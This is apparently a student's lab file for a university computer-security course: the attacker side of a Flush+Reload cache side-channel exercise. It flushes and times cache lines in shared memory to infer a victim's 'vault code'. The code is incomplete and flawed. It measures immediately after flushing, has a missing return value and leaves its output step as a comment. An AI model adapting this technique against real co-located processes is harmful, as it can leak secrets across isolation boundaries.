/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 * 
 *  thief.c is the attacker implementation. You need to add the code for 
 *  flush_reload().
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define SHARED_ID "CHANNEL"

#define BUF_LINES (4096 * 511)/64

// flush and reload should be straight forward
// you can traverse the buffer and use the utility functions
// to flush lines and perform the reload step.
int flush_reload(int size, uint8_t *buf) {
  uint64_t addr = (uint64_t) buf;

  for (int i = 0; i < BUF_LINES; i++) {
    // Set the first byte of each line to 1
    uint64_t lineAddr = addr + i * L2_LINE_SIZE;
//    (*((char *)lineAddr)) ++;
    clflush(lineAddr);
    uint32_t timing = measure_line_access_time(lineAddr);
    if (timing < 300 ) {
        printf("Address = %ld, set %d  timing = %d\n",lineAddr,i*64, timing);
    }
  }
}

int main(int argc, char const *argv[]) {
    int fd;
    fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (fd == -1){
	printf("shm_open error\n");
	exit(1);
    }

    int buf_size = 4096 * 512;
    uint8_t *buf;
    if ((buf = (uint8_t *)mmap(
           NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        printf("mmap error\n");
        exit(1);
    }
    

    // you may need to add repetitions  
    flush_reload(buf_size, buf);
    //print the key code and access time in the following  form
    // printf("Vault code: %d (%d)\n", key_code, latency);
 }
